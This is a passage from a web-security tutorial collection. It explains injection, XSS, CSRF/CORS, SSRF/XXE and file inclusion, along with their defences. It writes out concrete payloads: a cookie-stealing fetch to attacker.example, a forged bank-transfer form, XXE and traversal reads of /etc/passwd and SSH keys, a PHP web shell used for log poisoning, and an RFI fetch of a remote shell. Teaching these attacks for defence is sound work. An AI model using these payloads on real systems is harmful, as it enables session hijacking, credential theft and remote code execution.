host)\n</code></pre>\n<p>If <code>host = 8.8.8.8; cat /etc/passwd</code>, the shell parses two commands. Common metacharacters: <code>; &amp; | &amp;&amp; || \\</code> $(…) `…` &lt; &gt; &gt;&gt; |&amp;`. Trying to filter them is hopeless — see the SQLi argument above.</p>\n<p>Fix: invoke the binary directly without a shell, passing argv as a list:</p>\n<pre><code class=\"language-python\">subprocess.run([&quot;ping&quot;, &quot;-c&quot;, &quot;1&quot;, host])   # shell=False\n</code></pre>\n<p>Even when the binary itself accepts shell-meaningful characters, the OS process loader will not re-parse them.</p>\n<h2 id=\"nosql-injection\">NoSQL injection</h2>\n<p>MongoDB-style queries accept objects as filter values. A login expecting <code>{user:\"a\", pw:\"b\"}</code> might happily process <code>{user:\"a\", pw:{\"$ne\":null}}</code> — \"give me a user whose password is not null\" — bypassing authentication. Same root cause: the input was supposed to be a string literal but was allowed to become part of the query grammar.</p>\n<h2 id=\"server-side-template-injection-ssti\">Server-Side Template Injection (SSTI)</h2>\n<p>When user input lands inside a template that is <em>rendered server-side</em> (Jinja2, Twig, Velocity, Freemarker), <code>{{7*7}}</code> evaluating to <code>49</code> is the canary. From there the attacker walks the language's object graph to reach a code-execution primitive (Jinja <code>__class__.__mro__</code> → <code>subprocess.Popen</code>).</p>\n<p>Fix: never concatenate user input into a template <em>source</em>. Pass it as a <em>value</em> to a pre-compiled template.</p>\n<h2 id=\"ldap-injection-xpath-injection-expression-language-injection\">LDAP injection, XPath injection, expression-language injection</h2>\n<p>All variants of the same pattern. Once you internalise \"input becomes syntax\", you can find them in any interpreter the application touches.</p>\n<h2 id=\"defence-what-actually-works\">Defence // what actually works</h2>\n<p>In order of effectiveness:</p>\n<ol>\n<li><strong>Parameterised APIs</strong> at the interpreter boundary. Prepared statements for SQL, argv arrays for <code>exec</code>, parameterised template rendering, parameterised LDAP filters.</li>\n<li><strong>Strict input validation</strong> at the boundary — <em>allow-list</em>, not deny-list. If a field is supposed to be a 6-digit OTP, reject anything that is not <code>^\\d{6}$</code>. Allow-lists default to <em>safe</em>; deny-lists default to <em>vulnerable</em>.</li>\n<li><strong>Least privilege at the interpreter</strong> — the DB user the app talks to should not be able to drop tables; the shell command should not run as root.</li>\n<li><strong>WAF / runtime filtering</strong> — useful as defence in depth but never as the primary control. A bypass is one CTF writeup away.</li>\n</ol>\n<h2 id=\"closing-thought\">Closing thought</h2>\n<p>Injection ranked #1 on the OWASP Top 10 for over a decade for a reason: it is structurally trivial to introduce (one string concatenation) and structurally devastating to exploit (full execution in the interpreter's context). The defence is not cleverness — it is the discipline of using the right API at every boundary.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — Cross-Site Scripting (XSS)",
      "slug": "web-cross-site-scripting-xss",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "xss",
        "theory"
      ],
      "desc": "XSS happens when an application includes user-controlled data in a page in a way that the browser parses as JavaScript instead of as text. The attacker's code then runs in the victim's browser, in the victim's origin — meaning it can read cookies, DOM, localStorage, and make…",
      "body": "<h1 id=\"cross-site-scripting\">Cross-Site Scripting</h1>\n<p>XSS happens when an application includes user-controlled data in a page in a way that the browser parses as <strong>JavaScript</strong> instead of as text. The attacker's code then runs in the <em>victim's</em> browser, in the <em>victim's</em> origin — meaning it can read cookies, DOM, localStorage, and make authenticated requests as the victim.</p>\n<p>This is essentially injection again — but the interpreter is the browser, and the consequences are scoped to whoever loads the page.</p>\n<h2 id=\"the-three-flavours\">The three flavours</h2>\n<h3 id=\"reflected-xss\">Reflected XSS</h3>\n<p>User input is echoed back in the <em>same response</em>. The payload typically rides in a URL parameter, and the attack vector is a crafted link sent to the victim.</p>\n<pre><code>GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;\nHTML: &lt;h1&gt;Results for &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h1&gt;\n</code></pre>\n<p>Only the user who clicks the link is affected. The fix is output encoding (see below).</p>\n<h3 id=\"stored-xss\">Stored XSS</h3>\n<p>The payload is <em>persisted</em> (DB, log file, profile field, comment), and every visitor to the affected page is hit. This is the worst variant — one successful injection, many victims, automatically. Forum signatures, profile bios, and user-uploaded filenames are classic vectors.</p>\n<h3 id=\"dom-based-xss\">DOM-based XSS</h3>\n<p>The payload never touches the server. Vulnerable client-side JS reads from a <em>source</em> (<code>location.hash</code>, <code>document.referrer</code>, <code>postMessage</code>) and writes it to a <em>sink</em> (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code> with string arg) without sanitisation:</p>\n<pre><code class=\"language-js\">document.getElementById(&quot;welcome&quot;).innerHTML = &quot;Hi &quot; + location.hash.slice(1);\n</code></pre>\n<p><code>https://app.com/#&lt;img src=x onerror=alert(1)&gt;</code> and you are popped. Server-side filtering cannot stop this — the dangerous flow happens entirely in the browser.</p>\n<h3 id=\"blind-xss\">Blind XSS</h3>\n<p>Like stored, but the rendered page (admin panel, log viewer, support ticket UI) is not visible to the attacker. The payload phones home via a <code>fetch()</code> callback when it eventually fires. Used to compromise back-office staff days after the original injection.</p>\n<h2 id=\"why-output-encoding-is-the-fix\">Why output encoding is the fix</h2>\n<p>The root cause is <strong>context confusion</strong>: the developer wrote what they thought was text, but the browser saw HTML, attribute, or script. The cure is to encode the input for the <em>exact</em> context where it lands:</p>\n<table>\n<thead>\n<tr>\n<th>Context where input lands</th>\n<th>Correct encoding</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>&lt;div&gt;HERE&lt;/div&gt;</code></td>\n<td>HTML entity encode (<code>&lt;</code> → <code>&amp;lt;</code>)</td>\n</tr>\n<tr>\n<td><code>&lt;input value=\"HERE\"&gt;</code></td>\n<td>HTML attribute encode</td>\n</tr>\n<tr>\n<td><code>&lt;a href=\"HERE\"&gt;</code></td>\n<td>URL encode + protocol validation</td>\n</tr>\n<tr>\n<td><code>&lt;script&gt; var x = \"HERE\"; &lt;/script&gt;</code></td>\n<td>JS string escape</td>\n</tr>\n<tr>\n<td><code>&lt;style&gt; color: HERE; &lt;/style&gt;</code></td>\n<td>CSS escape</td>\n</tr>\n</tbody>\n</table>\n<p>Using the wrong encoding (HTML-encoding a JS context) is as bad as none. Template engines that <em>auto-context-aware-escape</em> (Go's <code>html/template</code>, modern React/Vue's JSX) eliminate the developer's chance to get it wrong — they look at where the placeholder is and apply the right encoding automatically.</p>\n<h2 id=\"what-xss-actually-does\">What XSS actually does</h2>\n<p>A short, real payload:</p>\n<pre><code class=\"language-html\">&lt;script&gt;\n  fetch(&quot;https://attacker.example/log?c=&quot; + btoa(document.cookie))\n&lt;/script&gt;\n</code></pre>\n<p>If the session cookie lacks <code>HttpOnly</code>, the attacker now has a full session. From the victim's browser the attacker can also:</p>\n<ul>\n<li>read DOM content (private messages, internal pages),</li>\n<li>trigger authenticated state-changing requests (XHR with cookies),</li>\n<li>rewrite the page (phishing inline),</li>\n<li>keylog the victim,</li>\n<li>pivot to internal network targets visible from the victim's browser,</li>\n<li>drop a beacon that survives by re-injecting itself (XSS worm).</li>\n</ul>\n<p>The session cookie being <code>HttpOnly</code> blunts the first one; nothing blunts the rest.</p>\n<h2 id=\"content-security-policy\">Content Security Policy</h2>\n<p>CSP is a response header that tells the browser which <em>sources</em> of script, style, fonts, images, etc. are allowed:</p>\n<pre><code>Content-Security-Policy: default-src 'self';\n  script-src 'self' https://cdn.example.com;\n  object-src 'none';\n  base-uri 'self';\n</code></pre>\n<p>A correctly-deployed CSP makes inline scripts (<code>&lt;script&gt;...&lt;/script&gt;</code>) and <code>eval</code> fail by default, neutralising the <em>result</em> of an XSS even if the <em>injection</em> succeeds. Pitfalls:</p>\n<ul>\n<li><code>'unsafe-inline'</code> defeats most of the point.</li>\n<li>Wildcards on CDNs you don't control (e.g. <code>https://*.s3.amazonaws.com</code>) are bypassable.</li>\n<li><code>data:</code> and <code>blob:</code> in <code>script-src</code> are exploitable.</li>\n<li>Trusted Types (CSP Level 3) extend protection to DOM sinks.</li>\n</ul>\n<h2 id=\"defence-checklist\">Defence checklist</h2>\n<ol>\n<li><strong>Auto-escape templates.</strong> Reach for an engine that escapes by default and refuses to let you opt out without a clear annotation.</li>\n<li><strong><code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> cookies.</strong> Damage control for when XSS happens anyway.</li>\n<li><strong>CSP without <code>unsafe-inline</code>.</strong> Forces all scripts to load from trusted origins.</li>\n<li><strong>Sanitisation libraries (DOMPurify) for rich-text input.</strong> Only when you must allow HTML. Never roll your own.</li>\n<li><strong>Strict input validation</strong> for fields that should not contain HTML (usernames, emails) — defence in depth.</li>\n<li><strong>Review every DOM sink</strong> (<code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout(\"...\")</code>, <code>Function(\"...\")</code>). Use <code>textContent</code> instead.</li>\n</ol>\n<p>XSS is one of the oldest vulnerabilities and still one of the most common. The reason isn't ignorance — it's that <em>any</em> place where the server emits user input is a candidate, and a single missed escape is enough.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — CSRF, Same-Origin Policy, CORS",
      "slug": "web-csrf-same-origin-policy-cors",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "csrf",
        "cors",
        "sop",
        "theory"
      ],
      "desc": "Three concepts that are constantly mixed up. They are related — they all live at the seam where the browser sends cross-origin requests — but they answer different questions.",
      "body": "<h1 id=\"csrf-the-same-origin-policy-and-cors\">CSRF, the Same-Origin Policy, and CORS</h1>\n<p>Three concepts that are constantly mixed up. They are related — they all live at the seam where the browser sends <em>cross-origin</em> requests — but they answer different questions.</p>\n<ul>\n<li><strong>SOP</strong> — \"can JavaScript at origin A <em>read</em> a response from origin B?\"</li>\n<li><strong>CORS</strong> — \"<em>relax</em> the SOP for specific cross-origin reads that origin B explicitly opts into.\"</li>\n<li><strong>CSRF</strong> — \"can origin A make the <em>victim's browser</em> send an <em>authenticated</em> request to origin B without their consent?\"</li>\n</ul>\n<p>Notice the asymmetry: SOP/CORS govern <em>reads</em>. CSRF abuses <em>writes</em> — those are not blocked by SOP at all.</p>\n<h2 id=\"origin\">Origin</h2>\n<p>An <em>origin</em> is the tuple <code>(scheme, host, port)</code>. <code>https://app.com:443</code> and <code>https://app.com:8443</code> are different origins. <code>https://app.com</code> and <code>http://app.com</code> are different origins. <code>app.com</code> and <code>sub.app.com</code> are different origins.</p>\n<p>This definition is the bedrock of browser security. Almost every web attack of consequence is an attempt to break it.</p>\n<h2 id=\"the-same-origin-policy\">The Same-Origin Policy</h2>\n<p>By default, JavaScript loaded from origin A cannot read the <em>response</em> of a request to origin B. The request still goes out (with cookies, if the user has them), and the server still runs — but the <em>response</em> is opaque to the calling page. This is what stops <code>evil.com</code> from running <code>fetch(\"https://bank.com/balance\")</code> and reading the JSON.</p>\n<p>Specifically blocked:</p>\n<ul>\n<li>Reading the body of cross-origin XHR / <code>fetch</code> responses.</li>\n<li>Reading the DOM of a cross-origin <code>&lt;iframe&gt;</code>.</li>\n<li>Reading pixels of a cross-origin <code>&lt;img&gt;</code> rendered to <code>&lt;canvas&gt;</code>.</li>\n</ul>\n<p>Specifically <em>not</em> blocked (so SOP alone is insufficient):</p>\n<ul>\n<li>Sending the request (with cookies attached).</li>\n<li>Loading <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;link rel=stylesheet&gt;</code>, <code>&lt;form action=...&gt;</code> cross-origin — the browser will fire the request and process the response (image renders, script executes) without ever exposing the bytes to the page.</li>\n</ul>\n<p>That last point is exactly the CSRF gap.</p>\n<h2 id=\"csrf-cross-site-request-forgery\">CSRF // Cross-Site Request Forgery</h2>\n<p>The attacker tricks the victim's browser into making a state-changing authenticated request to a target site. Two conditions are needed:</p>\n<ol>\n<li>The victim is <em>currently authenticated</em> to the target (valid cookie session).</li>\n<li>The target accepts the request <em>purely on the basis of the cookie</em>, with no anti-CSRF check.</li>\n</ol>\n<p>A minimal exploit hosted on <code>evil.com</code>:</p>\n<pre><code class=\"language-html\">&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;\n  &lt;input name=&quot;to&quot; value=&quot;attacker&quot;&gt;\n  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;\n</code></pre>\n<p>The browser submits the form to <code>bank.com</code> — and crucially, the browser attaches <code>bank.com</code>'s cookies. The server sees a valid session, no CSRF token, and processes the transfer. The attacker never read a single response (SOP holds); they didn't need to.</p>\n<h3 id=\"why-get-vs-post-doesnt-fix-it\">Why GET vs POST doesn't fix it</h3>\n<p>GET requests are also forgeable (any <code>&lt;img&gt;</code> tag triggers one). The right distinction is whether a request is <em>safe</em> (read-only, idempotent). State-changing GETs are doubly bad: cached, logged, linkable.</p>\n<h3 id=\"defences\">Defences</h3>\n<ul>\n<li><strong>CSRF tokens.</strong> Server emits a per-session unpredictable token in a hidden form field; rejects state-changing requests that lack it. The attacker cannot read the token (SOP blocks them) and cannot forge it.</li>\n<li><strong><code>SameSite=Lax|Strict</code> cookies.</strong> The browser refuses to send the cookie on cross-site requests. With <code>Lax</code> (the modern default), navigations via top-level link still send the cookie, but form POSTs from another origin do not. <code>Strict</code> is safer but breaks cross-site login flows. This is the single largest practical CSRF mitigation of the past decade.</li>\n<li><strong>Verify <code>Origin</code> / <code>Referer</code></strong> on state-changing requests. Cheap, defence-in-depth.</li>\n<li><strong>Custom request header.</strong> Browsers require a CORS preflight for non-simple requests with custom headers — and preflights cannot be forged from a <code>&lt;form&gt;</code> or <code>&lt;img&gt;</code>. So requiring <code>X-Requested-With: XMLHttpRequest</code> (or similar) on the API blocks form-based CSRF.</li>\n</ul>\n<h2 id=\"cors\">CORS</h2>\n<p>When a frontend at <code>https://app.com</code> legitimately needs to call an API at <code>https://api.com</code>, SOP is in the way. <strong>CORS</strong> (Cross-Origin Resource Sharing) is the controlled relaxation.</p>\n<p>Two flavours:</p>\n<h3 id=\"simple-requests\">Simple requests</h3>\n<p>GET/POST with a small set of \"safe\" headers and content types. The browser sends the request anyway and looks at the response headers:</p>\n<pre><code>Access-Control-Allow-Origin: https://app.com\n</code></pre>\n<p>If present and matching the requesting origin, the response is delivered to the page; otherwise it is blocked. <strong>Note:</strong> the request still hit the server. CORS protects the <em>reader</em>, not the server.</p>\n<h3 id=\"preflighted-requests\">Preflighted requests</h3>\n<p>Anything with custom headers, non-trivial content types, or non-GET/POST methods triggers an <code>OPTIONS</code> preflight first. The server must respond with explicit allows:</p>\n<pre><code>Access-Control-Allow-Origin: https://app.com\nAccess-Control-Allow-Methods: PUT, DELETE\nAccess-Control-Allow-Headers: Authorization, X-Custom\nAccess-Control-Allow-Credentials: true\n</code></pre>\n<p>Only if the preflight succeeds does the browser send the real request.</p>\n<h3 id=\"common-cors-misconfigurations\">Common CORS misconfigurations</h3>\n<ul>\n<li><strong><code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code></strong> — the spec forbids combining the two, but some servers reflect arbitrary <code>Origin</code> headers. An attacker hosts a page on <code>evil.com</code>, the server echoes <code>Access-Control-Allow-Origin: https://evil.com, Allow-Credentials: true</code>, and now <code>evil.com</code> can read authenticated responses from the API.</li>\n<li><strong>Trusting <code>Origin</code> from null</strong> — <code>Origin: null</code> is sent by sandboxed iframes, file:// pages, and certain redirects. Allow-listing it lets attackers reach the API from a <code>srcdoc</code> iframe.</li>\n<li><strong>Subdomain wildcard issues</strong> — allowing <code>*.app.com</code> when any subdomain is user-controllable (shared hosting, \"myname.app.com\" tenants).</li>\n</ul>\n<p>CORS is a configuration with very subtle failure modes. Treat any reflection of <code>Origin</code> into <code>Access-Control-Allow-Origin</code> as a vulnerability until proven otherwise.</p>\n<h2 id=\"a-clean-mental-model\">A clean mental model</h2>\n<pre><code>SOP   — read defence; on by default; cannot be turned off, only loosened by CORS.\nCORS  — explicit, server-side opt-in to specific cross-origin reads.\nCSRF  — write attack; needs the cookie to ride along, blocked by SameSite + tokens.\n</code></pre>\n<p>If you remember nothing else: SOP protects <em>reads</em>, SameSite + CSRF tokens protect <em>writes</em>. CORS is a knob to loosen SOP, not a security feature in itself.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — SSRF & XXE",
      "slug": "web-ssrf-xxe",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "ssrf",
        "xxe",
        "theory"
      ],
      "desc": "SSRF and XXE are two ways to achieve the same attacker goal: make the server perform a request to a destination of your choice. The server's network position — usually privileged, often able to reach internal services that the public cannot — is what makes the attack devastating.",
      "body": "<h1 id=\"ssrf-xxe-the-server-fetches-on-your-behalf-bug-class\">SSRF &amp; XXE // The \"Server Fetches On Your Behalf\" Bug Class</h1>\n<p>SSRF and XXE are two ways to achieve the same attacker goal: <strong>make the server perform a request to a destination of your choice</strong>. The server's network position — usually privileged, often able to reach internal services that the public cannot — is what makes the attack devastating.</p>\n<h2 id=\"server-side-request-forgery-ssrf\">Server-Side Request Forgery (SSRF)</h2>\n<p>SSRF appears any time the server takes a URL (or a URL fragment) from user input and dereferences it. Classic candidates: PDF-from-URL renderers, webhook configurators, image-by-URL uploaders, link previews, OAuth <code>redirect_uri</code> validators, SSO assertion consumers.</p>\n<h3 id=\"the-general-flow\">The general flow</h3>\n<pre><code>attacker → POST /webhook   { url: &quot;http://attacker.example/hook&quot; }\nserver   → GET  http://attacker.example/hook        ← intended\n       ── or with malicious input ──\nserver   → GET  http://169.254.169.254/latest/...   ← AWS metadata\nserver   → GET  http://localhost:8500/v1/kv/        ← internal Consul\nserver   → GET  file:///etc/passwd                  ← local file scheme\n</code></pre>\n<p>The server is a <em>new, more privileged client</em> from the attacker's perspective. From inside the VPC the server reaches services bound only to private IPs, cloud metadata endpoints with no auth, and admin interfaces left exposed because \"they're on localhost\".</p>\n<h3 id=\"what-the-attacker-actually-exfiltrates\">What the attacker actually exfiltrates</h3>\n<ul>\n<li><strong>Cloud credentials.</strong> EC2 instance metadata at <code>169.254.169.254</code> returns temporary IAM credentials. Many SSRF-to-RCE chains have started this way.</li>\n<li><strong>Internal admin panels</strong> — Kibana, Consul, Kubernetes API, Redis, Elasticsearch — often unauthenticated when bound to internal IPs.</li>\n<li><strong>Service discovery output</strong> that maps the internal network.</li>\n<li><strong>Source code</strong> via <code>file://</code> if the URL fetcher does not restrict schemes.</li>\n<li><strong>Authentication tokens</strong> echoed by an internal service to a request that <em>appears</em> internal.</li>\n</ul>\n<h3 id=\"blind-ssrf\">Blind SSRF</h3>\n<p>The server fetches but the response is not returned. Still exploitable: timing differences reveal open vs closed internal ports, DNS callback channels (<code>http://x.attacker.example/?id=foo</code>) confirm the request landed, and any side effect (a metric incremented, a job queued) leaks the result.</p>\n<h3 id=\"defences-in-order-of-effectiveness\">Defences (in order of effectiveness)</h3>\n<ol>\n<li><strong>Don't accept URLs.</strong> Use server-known identifiers (a webhook ID that maps to a stored URL the user configured separately, with admin approval).</li>\n<li><strong>Allow-list destinations.</strong> Resolve the hostname, verify the IP is in your allow-list, then reuse that resolved IP for the actual fetch. Otherwise a <em>DNS rebinding</em> attack — first DNS lookup returns a public IP that passes validation, subsequent lookup returns <code>169.254.169.254</code> — bypasses naive checks.</li>\n<li><strong>Block private ranges and metadata IPs.</strong> Hard-deny <code>127.0.0.0/8</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254/16</code>, <code>::1</code>, <code>fc00::/7</code>, <code>fe80::/10</code>. Apply the check <em>after</em> DNS resolution.</li>\n<li><strong>Restrict URL schemes.</strong> <code>http</code> and <code>https</code> only. Reject <code>file:</code>, <code>gopher:</code>, <code>dict:</code>, <code>ftp:</code> — they exist purely to broaden SSRF impact.</li>\n<li><strong>Network segmentation.</strong> The application backend should not have route or DNS visibility to the metadata service or admin VLAN in the first place.</li>\n</ol>\n<h3 id=\"cloud-metadata-the-special-case\">Cloud metadata // the special case</h3>\n<p>AWS's IMDSv1 was vulnerable for years (any HTTP GET from the instance returned IAM credentials, no headers required). IMDSv2 requires a PUT with a short-lived token first, which most SSRF primitives cannot perform. Migrating to IMDSv2 is the single highest-ROI cloud security change for any AWS user.</p>\n<h2 id=\"xml-external-entity-xxe\">XML External Entity (XXE)</h2>\n<p>XXE is what happens when an XML parser is fed user-controlled XML <em>and</em> is configured to resolve external entities — a legacy XML feature that lets a document reference external resources via URI.</p>\n<h3 id=\"the-mechanism\">The mechanism</h3>\n<p>XML allows you to declare entities at the top of a document:</p>\n<pre><code class=\"language-xml\">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>\n<p>When the parser expands <code>&amp;xxe;</code>, it dereferences <code>file:///etc/passwd</code> and inlines the contents into the document. Whatever the application does with the parsed XML next — echo it back, render it, store it — now contains the file.</p>\n<h3 id=\"variants\">Variants</h3>\n<ul>\n<li><strong>In-band XXE</strong> — the resolved entity is reflected in the parsed XML, which is echoed in the response.</li>\n<li><strong>Out-of-band (OOB / blind) XXE</strong> — no reflection. The attacker hosts a DTD on a remote server, which the parser fetches, and inside that DTD constructs a second entity that exfiltrates data via a callback URL. Used when the parser does not echo results back.</li>\n<li><strong>XXE → SSRF</strong> — same <code>SYSTEM</code> URI can be <code>http://internal-host/admin</code>. XXE becomes an SSRF primitive on top of the file-read primitive.</li>\n<li><strong>DoS (Billion Laughs)</strong> — entities can reference other entities recursively, expanding 1 byte into gigabytes during parsing.</li>\n</ul>\n<h3 id=\"why-this-is-still-common\">Why this is still common</h3>\n<ul>\n<li>Default-on entity expansion in many legacy parsers (<code>libxml2</code> pre-2.9, <code>XMLDecoder</code>, .NET's <code>XmlDocument</code> with default settings, Java <code>DocumentBuilderFactory</code> without <code>disallow-doctype-decl</code>).</li>\n<li>XML lurking in unexpected places: SOAP, OOXML (<code>.docx</code>, <code>.xlsx</code>), SVG uploads, RSS feeds, SAML assertions.</li>\n<li>\"We don't accept XML\" is often wrong — file upload handlers, image processors, and PDF renderers happily parse XML inside other formats.</li>\n</ul>\n<h3 id=\"defence\">Defence</h3>\n<p>The fix is one line of parser configuration in almost every language: <strong>disable external entity resolution and DTDs</strong>.</p>\n<pre><code># Java\nfactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);\n\n# Python (defusedxml)\nfrom defusedxml.ElementTree import parse\n\n# .NET\nsettings.DtdProcessing = DtdProcessing.Prohibit;\n</code></pre>\n<p>Use <code>defusedxml</code> (Python), <code>safe_yaml</code> for YAML, <code>nokogiri</code> with safe defaults (Ruby) — security-conscious wrappers around the standard parsers exist precisely so you don't have to remember every flag.</p>\n<h2 id=\"why-these-two-belong-together\">Why these two belong together</h2>\n<p>SSRF and XXE are both <em>server-side-fetch-on-attacker-input</em> bugs. SSRF abuses an explicit fetch primitive (the application means to call a URL); XXE abuses an implicit fetch primitive (a parser feature most developers don't know is on). The post-exploitation playbook — metadata theft, internal lateral movement, port mapping — is the same. Spotting one in an audit means spending an afternoon looking for the other.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — File Inclusion (LFI / RFI)",
      "slug": "web-file-inclusion-lfi-rfi",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "lfi",
        "rfi",
        "theory"
      ],
      "desc": "File inclusion vulnerabilities arise when a web application uses user-controlled input as a file path in an inclusion or load operation. The interpreter then reads or executes whatever the user pointed at, treating attacker-controlled data as part of the application's source…",
      "body": "<h1 id=\"file-inclusion-lfi-rfi\">File Inclusion // LFI &amp; RFI</h1>\n<p>File inclusion vulnerabilities arise when a web application uses <strong>user-controlled input as a file path</strong> in an inclusion or load operation. The interpreter then reads or executes whatever the user pointed at, treating attacker-controlled data as part of the application's source code or its outputs.</p>\n<p>The root cause is the same shape as injection (input becomes code) but the <em>target</em> is the application's own filesystem rather than an interpreter's grammar. Two flavours:</p>\n<ul>\n<li><strong>LFI</strong> (Local File Inclusion) — the included path resolves to a file on the server.</li>\n<li><strong>RFI</strong> (Remote File Inclusion) — the included path resolves to a URL on a remote server the attacker controls.</li>\n</ul>\n<p>LFI is the more common modern variant; RFI is mostly historical PHP, but the underlying mistake (include user input) is identical.</p>\n<h2 id=\"the-vulnerable-shape\">The vulnerable shape</h2>\n<p>A page that loads templates by name:</p>\n<pre><code class=\"language-php\">&lt;?php\n  $page = $_GET['page'];   // e.g. &quot;about&quot;\n  include(&quot;/var/www/templates/&quot; . $page . &quot;.php&quot;);\n?&gt;\n</code></pre>\n<p>Intended use: <code>?page=about</code> loads <code>/var/www/templates/about.php</code>. Attacker uses path traversal: <code>?page=../../../../etc/passwd%00</code> and <code>include()</code> reads <code>/etc/passwd</code>. On older PHP versions a null byte truncated the appended <code>.php</code>; on modern PHP the suffix sticks, so attackers reach for <em>wrappers</em> instead (see below).</p>\n<p>The same pattern exists in every server-side language that has an \"include/require/load by path\" primitive — Java JSP <code>&lt;jsp:include&gt;</code>, Python <code>importlib</code>, Ruby's <code>load</code>, Node's dynamic <code>require</code>, ASP <code>Server.Execute</code>. PHP is the historical canonical victim because <code>include()</code> <em>executes</em> the contents as PHP code if they parse as such.</p>\n<h2 id=\"lfi-variants-what-the-attacker-actually-reads\">LFI variants // what the attacker actually reads</h2>\n<h3 id=\"sensitive-file-disclosure\">Sensitive file disclosure</h3>\n<p>The simplest impact: read configuration, source code, credentials.</p>\n<pre><code>?page=../../../../etc/passwd\n?page=../../../../etc/shadow                ← needs read access (rare)\n?page=../../../../proc/self/environ          ← env vars of the web process\n?page=../../../../var/log/apache2/access.log\n?page=../../../../../home/user/.ssh/id_rsa\n?page=../../../../../home/user/.bash_history\n</code></pre>\n<p>On Windows the same with <code>C:\\Windows\\win.ini</code>, <code>C:\\inetpub\\logs\\LogFiles\\…</code>, etc.</p>\n<h3 id=\"lfi-rce-via-log-poisoning\">LFI → RCE via log poisoning</h3>\n<p>If the attacker can write into a log the LFI can read, and the read interpreter executes the contents:</p>\n<ol>\n<li>Send an HTTP request with a <code>User-Agent</code> of <code>&lt;?php system($_GET['c']); ?&gt;</code>.</li>\n<li>Apache logs that User-Agent verbatim into <code>/var/log/apache2/access.log</code>.</li>\n<li>Trigger the LFI: <code>?page=../../../../var/log/apache2/access.log&amp;c=id</code>.</li>\n<li>PHP includes the log file, parses the embedded PHP tags, executes <code>system('id')</code>.</li>\n</ol>\n<p>Variants of \"write into a file the include sees\" power the same chain: SSH login attempts with malicious usernames into <code>/var/log/auth.log</code>, mail logs, error logs, session files (<code>/var/lib/php/sessions/sess_&lt;id&gt;</code>).</p>\n<h3 id=\"lfi-rce-via-php-wrappers\">LFI → RCE via PHP wrappers</h3>\n<p>PHP exposes virtual <em>streams</em> through <code>include</code>. They are not files at all — they are protocols that transform their target.</p>\n<ul>\n<li><code>php://filter/convert.base64-encode/resource=index.php</code> — base64-encodes the file contents before including. This <em>prevents</em> PHP execution and returns the source code instead. Used for <strong>source disclosure</strong> of <code>.php</code> files that would otherwise be silently executed.</li>\n<li><code>php://filter/read=string.rot13/resource=…</code> — same idea with ROT13.</li>\n<li><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</code> — supplies the <em>content</em> inline as a data URI. <code>include()</code> parses it as PHP. Requires <code>allow_url_include=On</code> (off by default since PHP 5.2).</li>\n<li><code>expect://id</code> — executes a shell command. Requires the <code>expect</code> PHP extension.</li>\n<li><code>phar://upload.zip/inside.txt</code> — triggers Phar deserialisation of the archive's metadata, potentially RCE via gadget chain (Phar deserialisation is a whole sub-class).</li>\n<li><code>file://…</code>, <code>zip://…</code>, <code>compress.zlib://…</code> — additional vectors.</li>\n</ul>\n<p>Each wrapper turns a <em>read</em>-style primitive (LFI) into a richer capability (source disclosure, code execution, deserialisation). The attacker tries them in order based on what the PHP configuration permits.</p>\n<h3 id=\"lfi-ssrf-network-reach\">LFI → SSRF / network reach</h3>\n<p><code>include('http://internal-host/file.txt')</code> (or <code>file_get_contents</code> with the same pattern) lets the LFI dereference <em>remote</em> URLs — at which point it has become SSRF (see article 11). The same configuration knob (<code>allow_url_fopen</code>) controls both.</p>\n<h2 id=\"rfi-specifically\">RFI specifically</h2>\n<p>When the include accepts <code>http://</code> or <code>ftp://</code> URLs as paths:</p>\n<pre><code>?page=http://attacker.example/shell.txt\n</code></pre>\n<p>The server fetches <code>shell.txt</code> from the attacker's host, the contents are PHP code (<code>&lt;?php system($_GET['c']); ?&gt;</code>), <code>include()</code> parses and executes them in the application's process context. Instant RCE without needing log poisoning, wrappers, or any local writing.</p>\n<p>RFI requires <code>allow_url_include=On</code> in PHP — disabled by default for over a decade. It is rare in modern hosts; legacy systems running PHP 5.x with default-on <code>allow_url_include</code> still exist in industrial control systems, embedded devices, and abandoned hosting.</p>\n<h2 id=\"why-filters-dont-fix-it\">Why filters don't fix it</h2>\n<p>Common naive defences and their bypasses:</p>\n<ul>\n<li><strong>Strip <code>../</code></strong> → use <code>....//</code> (after one collapse: <code>../</code>).</li>\n<li><strong>Block <code>..</code></strong> → use absolute paths (<code>/etc/passwd</code>).</li>\n<li><strong>Only allow filenames starting with letters</strong> → use the <code>php://filter</code> wrappers.</li>\n<li><strong>Block <code>http://</code> and <code>https://</code></strong> → use <code>data://</code>, <code>php://</code>, <code>expect://</code>.</li>\n<li><strong>Append <code>.php</code> to truncate the suffix</strong> → null byte (legacy), <code>?</code> to terminate the path, or one of the wrappers that doesn't care about extensions.</li>\n<li><strong>Allow-list specific filenames</strong> → confusing implementation that allow-lists <em>part</em> of the path while letting the attacker 